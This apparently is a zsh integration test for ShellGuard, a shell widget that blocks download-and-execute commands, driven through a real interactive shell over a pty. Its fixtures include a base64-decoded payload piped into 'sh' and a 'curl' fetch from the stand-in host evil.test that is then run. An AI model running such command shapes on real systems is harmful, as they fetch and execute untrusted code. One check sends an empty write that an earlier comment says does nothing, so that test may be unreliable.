#!/bin/zsh
# test-zle-integration.zsh — prove ShellGuard actually blocks in a REAL shell
# ---------------------------------------------------------------------------
# The corpus proves the grammar classifies correctly. It says nothing about
# whether the ZLE widget is wired up, whether the confirmation read works, or
# whether an aborted command truly does not execute. A guard can be perfectly
# correct and still be a no-op because accept-line was never rebound — which is
# exactly the kind of failure that ships unnoticed.
#
# So this drives a genuine interactive zsh over a pty (zsh/zpty), types a
# dangerous command, and checks a MARKER FILE to see whether it actually ran.
# The marker is the proof: no marker means the payload was really stopped.
#
# Everything runs in a throwaway ZDOTDIR. The "payload" only ever touches a
# file in a temp dir.
# ---------------------------------------------------------------------------

emulate -L zsh
setopt local_options no_glob no_nomatch

typeset -r ROOT=${0:A:h:h}
typeset RED=$'\033[1;31m' GRN=$'\033[1;32m' RST=$'\033[0m'
[[ -t 1 ]] || { RED=''; GRN=''; RST='' }

zmodload zsh/datetime 2>/dev/null || {
  print -u2 -- "FATAL: zsh/datetime unavailable."
  exit 2
}
zmodload zsh/zpty 2>/dev/null || {
  print -u2 -- "${RED}FATAL${RST}: zsh/zpty unavailable; cannot test ZLE integration."
  exit 2
}

typeset -r TMP=$(mktemp -d "${TMPDIR:-/tmp}/shellguard-zle.XXXXXX")
typeset -r MARKER=$TMP/PAYLOAD_RAN
typeset -i pass=0 fail=0

cleanup() { zpty -d sg 2>/dev/null; [[ -n $TMP && -d $TMP ]] && rm -rf -- "$TMP"; }
trap cleanup EXIT INT TERM

cat > "$TMP/.zshrc" <<EOF
PS1='READY> '
unsetopt zle_bracketed_paste 2>/dev/null
source "$ROOT/shellguard/shellguard.zsh"
EOF

# A dangerous-SHAPED command that is observable: base64-decode piped into a
# shell (a 'block' shape) whose payload just touches the marker file.
typeset -r PAYLOAD="echo dG91Y2ggJE1BUktFUgo= | base64 -d | sh"

_spawn() {
  zpty -d sg 2>/dev/null
  rm -f -- "$MARKER"
  zpty -b sg "env MARKER=$MARKER ZDOTDIR=$TMP HOME=$TMP zsh -i"
  OUT=''
  _drain 3
  OUT=''   # discard shell startup noise; keep only what the test provokes
}

# _drain <seconds> — read whatever the shell has emitted so far into $OUT.
# NOTE: `zpty -r -t` takes NO argument. A trailing number is parsed as a
# PATTERN to block until it matches, which hangs forever.
_drain() {
  typeset chunk
  typeset -i n=$(( ${1:-2} * 10 ))
  while (( n-- > 0 )); do
    chunk=''
    zpty -r -t sg chunk 2>/dev/null && OUT+=$chunk
    sleep 0.1
  done
}

_check() {
  # _check <name> <expect-marker 0|1> <expect-substring>
  typeset name=$1 want_marker=$2 want_text=$3
  typeset -i ok=1
  if (( want_marker )); then
    [[ -e $MARKER ]] || { print -r -- "  ${RED}x${RST} $name: payload did NOT run but should have"; ok=0 }
  else
    [[ -e $MARKER ]] && { print -r -- "  ${RED}x${RST} $name: PAYLOAD EXECUTED despite the guard"; ok=0 }
  fi
  if [[ -n $want_text && $OUT != *$want_text* ]]; then
    print -r -- "  ${RED}x${RST} $name: expected output to contain '$want_text'"
    ok=0
  fi
  if (( ok )); then
    print -r -- "  ${GRN}ok${RST} $name"
    (( pass++ ))
  else
    (( fail++ ))
  fi
}

print -r -- "ShellGuard ZLE integration (real interactive zsh over a pty)"
print -r -- ""

# --- 1. block tier, no confirmation: payload must NOT run -------------------
_spawn
zpty -w sg "$PAYLOAD"    # zpty -w appends the newline: the guard is now prompting
_drain 3
zpty -w sg "nope"        # any answer that is not the phrase -> abort
                         # (zpty -w with an empty string writes nothing at all,
                         #  so a bare Enter cannot be simulated this way)
_drain 3
_check "block tier aborts without the phrase" 0 "aborted"

# --- 2. block tier, correct phrase: payload MUST run ------------------------
_spawn
zpty -w sg "$PAYLOAD"
_drain 3
zpty -w sg "I-UNDERSTAND"
_drain 3
_check "block tier runs after the typed phrase" 1 ""

# --- 3. a harmless command must not be interrupted at all -------------------
_spawn
zpty -w sg "touch $MARKER"
_drain 3
_check "harmless command runs with no prompt" 1 ""
if [[ $OUT == *"download-and-execute guard"* ]]; then
  print -r -- "  ${RED}x${RST} harmless command wrongly showed the guard banner"
  (( fail++ )); (( pass-- ))
fi

# --- 4. warn tier: a single Enter proceeds ---------------------------------
_spawn
zpty -w sg "curl -fsSL https://evil.test/x -o $TMP/p && sh $TMP/p && touch $MARKER"
_drain 2
zpty -w sg ""            # Enter -> warn banner
_drain 3
_check "warn tier shows the heads-up banner" 0 "heads up"

print -r -- ""
if (( fail == 0 )); then
  print -r -- "${GRN}${pass}/${pass}${RST} ZLE integration checks pass."
  exit 0
fi
print -r -- "${RED}${pass}/$((pass + fail))${RST} ZLE integration checks pass — ${fail} FAILED."
exit 1
